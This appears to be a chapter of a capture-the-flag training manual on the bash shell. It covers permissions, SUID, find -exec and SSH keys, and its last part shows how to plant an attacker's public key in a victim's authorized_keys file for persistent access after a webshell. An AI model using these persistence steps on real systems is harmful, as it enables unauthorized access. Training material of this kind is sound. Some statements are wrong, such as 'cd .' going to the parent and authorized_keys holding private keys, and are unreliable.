

<!--- category: Shell --->
<!--- id: intro --->
<!--- title: Shell --->
<!--- keywords:  --->
## Shell

Your terminal uses shell commands to manipulate the file system.
.
There are several shells, each with its own particularity.
We are looking at the most common one, the bash shell.
.
You are logged into an account, which you can get to know with the command id.
This account has rights, and belongs to groups.
With the command ls -al xxx, you display the rights of each file.
.
We will read every readable file belonging to other accounts and get valuables informations.
We will also try to get acces to other accounts.
The ultimate goal is to get the administrator's account (root).



<!--- category: Shell --->
<!--- id: commandes --->
<!--- title: Common shell commands --->
<!--- keywords:  --->
## Common shell commands

```
ls        : display the content of the current directory
ls -l     : display the contents of the current directory, with info on file permissions
ls -l xxx : display the rights of file xxx
ls -al    : display the contents of the current directory, including hidden files
cat xxx   : display the content of file xxx
pwd       : current directory
cd xxx    : move to the xxx directory
cd .      : move to parent directory
id        : identifier of the current account and groups it belongs to
uname -a  : server information: which distribution and kernel version.
```




<!--- category: Shell --->
<!--- id: flag_shell --->
<!--- title: Flag --->
<!--- keywords:  --->
## Flag

Some flags can be found in your terminal.<br/>
Start in the /home/yolo/flags directory before expanding to your entire system.<br/>
This is an opportunity to practice the commands detailed in this chapter.
And since you read the manual, here is a gift: Flag_rtfm_shell
```
cd ~/flags
```




<!--- category: Shell --->
<!--- id: dir --->
<!--- title: Common directories --->
<!--- keywords:  --->
## Common directories

The Unix file system starts from the root: /<br/>
It usually contains the directories:
```
/home/xxx: one directory per user account xxx
~        : your user directory
/root    : the administrator's directory
/tmp     : temporary files
/bin     : system commands
/etc     : system configuration files
/var/log : logs of programs like the web server
/var/www : default location for web server files
```




<!--- category: Shell --->
<!--- id: shell-permissions --->
<!--- title: Unix - File Permission --->
<!--- keywords:  --->
## Unix - File Permission
All files and directories have an owner, and are part of a group.   
Each file therefore defines permissions for:   
- User: the owner   
- Group: users who are part of the group   
- Other: users who are neither the owner nor in the group   
   
Basic permissions are:   
- Read: Read    
- Write: Writing    
- eXecute: Execution    
   
Listing file rights   
```
ls -al          : -al allows to list the rights of files, including hidden ones.
 rwxr-xr--
 \ /\ /\ /
  v  v  v
  |  |  rights of other users (o)
  |  |
  |  rights of users belonging to the group (g)
  |
  owner's rights (u)
```
 
```
$ ls -al           
total 192
drwxrwxr-x 18 yolo yolo 4096 janv. 25 14:23 .          : rights of the current directory
drwxrwxr-x 26 yolo yolo 4096 févr.  5 10:55 ..         : parent directory rights
-rw-rw-r--  1 yolo yolo 5917 janv. 25 14:23 readme.txt : read/write User/Group, read only for Other
-rwxr-xr-x  1 yolo yolo 2642 janv. 25 11:31 run        : read/write/execute for user, read/execute for group and others
```
   


Additional permissions exist:   
- SUID: Set UID, the file is executed with the rights of its owner.   
- SGID: Set GUID, the file is executed with the rights of its group.   
- Sticky Bit: When this right is set on a directory, it prevents any user other than the owner of the file from deleting a file in the directory.   
   
```
$ ls -al           
total 192
drwxrwxr-x 18 yolo yolo 4096 janv. 25 14:23 .          
drwxrwxr-x 26 yolo yolo 4096 févr.  5 10:55 ..         
rwsr-xr-x  1 yolo yolo 2642 janv. 25 11:31 run        : the x is replaced by an s for User
```
  
The SUID bit allows us to launch commands with the rights of another user and make privilege elevation.



<!--- category: Shell --->
<!--- id: chmod --->
<!--- title: Set file permissions --->
<!--- keywords:  --->
## Set file permissions
The chmod command allows to add (+) or remove (-) the rights (r,w,x) to the owner (u), group (g), others (o) or all (a).
```
chmod u+x ./run  : the owner can execute
chmod g-x ./run  : the group can't execute
chmod o+r ./run  : others can read
chmod a+w ./run  : all can write in the file
```

   
Values of x,r,w can be set in binary form.
```
r=4, w=2, x=1 

rwx = 4+2+1 = 7
r-x = 4+0+1 = 5
r-- = 4+0+0 = 4

rwxrx-r-- = 764
chmod 764 readme.txt
```




<!--- category: Shell --->
<!--- id: files --->
<!--- title: Usefull files --->
<!--- keywords:  --->
## Usefull files

```
/etc/passwd : users list
/etc/hosts : host names and aliases
```




<!--- category: Shell --->
<!--- id: find --->
<!--- title: find --->
<!--- keywords:  --->
## find
The find command is used to search for files in directories, and possibly to perform actions on the found files.
```
find . -name *.txt```

Search for files with the .txt extension in the current directory and subdirectories.   
```
find / -name *.php```

Search for files with the .php extension from the root. 
```
find / -name *.php 2&gt;/dev/null```

The screen is saturated with the list of directories that are forbidden to us to read. The command 2>/dev/null redirects the errors to the virtual file /dev/null which makes them disappear from the display.
```
find / -name *.php -exec ls {} \; 2&gt;/dev/null```

The -exec option is used to run a command on each file found. Often ls -al, or cat.      
{} is replaced by the name of the file found.    
\; is put at the end of the command to be executed.




<!--- category: Shell --->
<!--- id: find-exec --->
<!--- title: find -exec --->
<!--- keywords:  --->
## find -exec
The find command is used to execute commands on found files.    
    
```
find / -name *.txt -user yolo -exec cat {} \; 2&gt;/dev/null```

Run the cat command on all .txt files belonging to yolo from the root.    
    
___Syntax of the command:___      
The {} is replaced by the name of the found files, and the \; is used as the end-of-command delimiter for the command to be executed.



<!--- category: Shell --->
<!--- id: ssh --->
<!--- title: SSH --->
<!--- keywords:  --->
## SSH

Connections to the servers are done in ssh.<br/>
Either with a login/password
```
ssh user@hostname
```

Either with a private key file
```
ssh -i id_rsa user@hostname
```




<!--- category: Shell --->
<!--- id: sshidrsa --->
<!--- title: SSH : Private / Public keys pairs --->
<!--- keywords:  --->
## SSH : Private / Public keys pairs

On servers, it is common to identify yourself with a private key rather than a password. 
Your keys can be found in : 
```
$ ls -al ~/.ssh
total 20
drwx------  2 yolo yolo 4096 Apr  4 13:47 .
drwxr-xr-x 27 yolo yolo 4096 Apr  4 13:22 ..
-rw-------  1 yolo yolo 2610 Apr  4 13:47 id_rsa
-rw-r--r--  1 yolo yolo  575 Apr  4 13:47 id_rsa.pub
-rw-r--r--  1 yolo yolo 1998 Apr  1 19:45 known_hosts
```

Your private keys are in the file :
```
~/.ssh/authorized_keys
```




<!--- category: Shell --->
<!--- id: sshidrsagen --->
<!--- title: SSH : Generate a private/public key pair --->
<!--- keywords:  --->
## SSH : Generate a private/public key pair

Generate a private/public key pair:<br/>
Just type [enter] to (empty for no passphrase) to generate a private key without a password.
If you enter a password, your key will be encrypted, and you will have to type the password every time you use it.
```
$ ssh-keygen -t rsa -b 4096 -C yolo@yoloctf.org -f id_rsa
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again:
Your identification has been saved in id_rsa
Your public key has been saved in id_rsa.pub
The key fingerprint is:
SHA256:OSHYGRwrI7LM9/8haFfVXgBlXrdHcdfEZxIv9CeWg5Q yolo@yoloctf.org
The key's randomart image is:
+---[RSA 4096]----+
|     .o.   .+=o*O|
|     o.+   .Eo+=X|
|. . + = .  ..o*=*|
|oo . o . o. ...+o|
|.o .    S.   .   |
|  . . . ..       |
|     + o .       |
|    . o . .      |
|       ...       |
+----[SHA256]-----+
```

The private key file should only be readable by its owner.<br/>
If needed do: chmod 600 id_rsa.
```
vagrant@kali:/home/yolo/tmp$ ls -al
total 16
drwxrwxrwx  2 yolo      yolo   4096 Apr  4 13:24 .
drwxr-xr-x 27 yolo 		yolo   4096 Apr  4 13:22 ..
-rw-------  1 yolo      yolo   3381 Apr  4 13:24 id_rsa
-rw-r--r--  1 yolo      yolo    742 Apr  4 13:24 id_rsa.pub
```

Private key headers are easy to identify:
```
$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEA4hHFXkYNJLp47GZdP1LEJ3rueKhu4c9SCqzbeJfaWUJY/nZSmV76
7KrJLvv/4Ve+Dm5bLwhJ9BkLessiIlGgx0ju+ghI7V+Ar+qAhir5chpVSGH4YIk0J8VDbJ
...
O9mUtgl8PKUd5AQL6sMM/FaYffu7+OFQkJzv3hxyiFEQPhsAo2K55cG8S0RWCX9Jp96U54
lOXLj6MfGkfzuvvFS4pm9iTBrwKq8h7CubmNOnHe3TH3U/Mrzf6wq8MwAEpSeTWfnBGdRP
tHOBQdCIQj3JAAAAEHlvbG9AeW9sb2N0Zi5vcmcBAg==
-----END OPENSSH PRIVATE KEY-----
```

Password protected Key header:
```
$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25325A9B318F344B8391AFD767D6D

NhAAAAAwEAAQAAAgEA4hHFXkYNJLp47GZdP1LEJ3rueKhu4c9SCqzbeJfaWUJY/nZSmV76
```



Public key :
```
$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQAxxxxx8/QoN3NBob3zs4l2mfZWkZNAtCHN2CpQ== yolo@yoloctf.org
```




<!--- category: Shell --->
<!--- id: sshidrsadechiffre --->
<!--- title: SSH : Remove private key password --->
<!--- keywords:  --->
## SSH : Remove private key password

Once the password of a private key found with John, it is possible to remove it for simplicity.
```
openssl rsa -in [id_rsa_sec] -out [id_rsa]
```




<!--- category: Shell --->
<!--- id: sshidrsaauth --->
<!--- title: SSH : Allow private key authentication --->
<!--- keywords:  --->
## SSH : Allow private key authentication

The public keys to connect in ssh are listed, one key per line, in the file.
```
~/.ssh/authorized_keys
```


Once on a user account of a server, inject your public key to have a direct access in ssh.
```
echo 'ssh-rsa AAAAB3xxxxxxtCHN2CpQ== yolo@yoloctf.org' >> /home/victim/.ssh/authorized_keys
```

If the directory does not exist, just create it:
```
mkdir /home/victim/.ssh
chmod 700 /home/victim/.ssh
echo 'ssh-rsa AAAAB3xxxxxxtCHN2CpQ== yolo@yoloctf.org' >> /home/victim/.ssh/authorized_keys
chmod 600 /home/victim/.ssh/authorized_keys
```

Close your webshell, and come back in ssh:
```
ssh -i id_rsa_yolo victim@target.com
```


